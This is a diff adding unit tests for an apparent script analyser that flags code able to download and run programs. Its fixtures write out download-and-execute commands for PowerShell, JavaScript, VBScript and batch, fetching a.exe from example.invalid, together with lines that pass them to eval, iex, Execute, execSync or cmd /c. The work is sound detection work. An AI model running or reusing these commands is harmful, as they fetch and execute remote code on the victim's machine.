@@ -261,6 +261,77 @@ if ($blocked -contains $args[0]) { Write-Host "blocked" }
         js = "var parts = ['Invoke-WebRequest', 'https://example.invalid/a.ps1']; eval(parts.join(' ')); WScript.Run(1)\n"
         self.assertIn("download-run", self.abilities(js, "a.js"))
 
+    # A blocklist of download-and-run commands, then one line that hands a list item to code that runs text.
+    # Only read as text, never run; the addresses are example.invalid.
+    LISTS = {
+        "ps1": "$cmds = @('Invoke-WebRequest https://example.invalid/a.exe -OutFile a.exe', 'Start-Process a.exe')\n",
+        "js": 'const BLOCKED = ["powershell iwr https://example.invalid/a.exe", "start-process a.exe"];\n',
+        "vbs": 'cmds = Array("powershell iwr https://example.invalid/a.exe", "start-process a.exe")\n',
+        "bat": 'set BLOCKED="curl https://example.invalid/a.exe -o a.exe","cmd /c a.exe","iwr"\r\n',
+    }
+    SINKS = [
+        ("ps1", "Invoke-Expression", "iex $cmds[0]\n"),
+        ("ps1", "Invoke-Expression", "Invoke-Expression $cmds[0]\n"),
+        ("ps1", "Invoke-Command", "foreach ($c in $cmds) { Invoke-Command -ArgumentList $c -ScriptBlock { param($x) } }\n"),
+        ("ps1", "[scriptblock]::Create", "$block = [scriptblock]::Create($cmds[0])\n"),
+        ("ps1", "$ExecutionContext", "$ExecutionContext.InvokeCommand.InvokeScript($cmds[0])\n"),
+        ("ps1", "Add-Type", "Add-Type -TypeDefinition $cmds[0]\n"),
+        ("ps1", "& (call operator)", "& $cmds[1]\n"),
+        ("ps1", ". (dot source)", ". $cmds[1]\n"),
+        ("ps1", "Start-Process with a variable", "Start-Process -FilePath $cmds[1]\n"),
+        ("ps1", "cmd /c with a variable", "cmd.exe /c $cmds[1]\n"),
+        ("js", "eval", "eval(BLOCKED[0]);\n"),
+        ("js", "Function()", "new Function(BLOCKED[0])();\n"),
+        ("js", "Function()", "Function('c', 'return c')(BLOCKED[0]);\n"),
+        ("js", "child_process with a variable", 'const cp = require("child_process");\ncp.execSync(BLOCKED[0]);\n'),
+        ("js", "WScript.Shell with a variable", 'new ActiveXObject("WScript.Shell").Run(BLOCKED[0]);\n'),
+        ("vbs", "Execute / ExecuteGlobal", "Execute cmds(0)\n"),
+        ("vbs", "Execute / ExecuteGlobal", "ExecuteGlobal cmds(0)\n"),
+        ("vbs", "Eval", "x = Eval(cmds(0))\n"),
+        ("vbs", "WScript.Shell with a variable", 'CreateObject("WScript.Shell").Run "cmd /c " & cmds(0), 1\n'),
+        ("bat", "a variable run as a command", "for %%c in (%BLOCKED%) do %%~c\r\n"),
+        ("bat", "cmd /c with a variable", "cmd /c %BLOCKED%\r\n"),
+        ("bat", "start with a variable", 'start "" %BLOCKED%\r\n'),
+    ]
+
+    def test_every_kind_of_code_that_runs_text_is_recognised(self):
+        for lang, sink, line in self.SINKS:
+            with self.subTest(sink=sink, line=line):
+                self.assertIn(sink, scripts.runs_text(line, lang))
+
+    def test_a_list_that_reaches_code_that_runs_text_counts(self):
+        for lang, sink, line in self.SINKS:
+            with self.subTest(sink=sink, line=line):
+                found = self.abilities(self.LISTS[lang] + line, f"a.{lang}")
+                self.assertIn("download-run", found)
+
+    def test_the_same_lists_alone_are_only_lists(self):
+        for lang, text in self.LISTS.items():
+            with self.subTest(lang=lang):
+                self.assertFalse({"download", "download-run"} & self.abilities(text + "\n", f"a.{lang}"))
+
+    def test_plain_text_commands_and_names_in_the_list_dont_count(self):
+        """Running a fixed program (no variable) can't run a list item; a list that names iex/eval is a list."""
+        fixed = {
+            "ps1": "Start-Process 'notepad.exe'\n& 'C:\\Tools\\tool.exe' /quiet\nif ($cmds -contains $args[0]) { 'no' }\n",
+            "js": 'const cp = require("child_process");\ncp.execSync("git status");\ncp.execFile("git", "-v");\n',
+            "vbs": 'CreateObject("WScript.Shell").Run "notepad.exe", 1\nSet m = re.Execute(cmds(0))\n',
+            "bat": 'start "" notepad.exe\r\ncmd /c dir\r\n',
+        }
+        for lang, text in fixed.items():
+            with self.subTest(lang=lang):
+                self.assertEqual([], scripts.runs_text(text, lang))
+                self.assertFalse({"download", "download-run"} & self.abilities(self.LISTS[lang] + text, f"a.{lang}"))
+        names = "$blocked = @('iex', 'Invoke-Expression', 'Invoke-WebRequest https://x', 'Start-Process $x')\n"
+        self.assertFalse({"download", "download-run"} & self.abilities(names, "a.ps1"))
+        js = "const BAD = ['eval(', 'child_process', 'curl https://example.invalid/a | sh', 'powershell -c x'];\n"
+        self.assertFalse({"download", "download-run"} & self.abilities(js, "a.js"))
+
+    def test_a_list_handed_straight_to_a_program_is_a_command(self):
+        js = ('const cp = require("child_process");\n'
+              'cp.spawn("powershell", ["-c", "iwr https://example.invalid/a.exe -OutFile a.exe; start-process a.exe"]);\n')
+        self.assertIn("download-run", self.abilities(js, "a.js"))
+
     def test_code_only_keeps_strings_in_place(self):
         code = scripts.code_only("x = 'http://a//b' // comment\n", "js")
         self.assertIn("'http://a//b'", code)
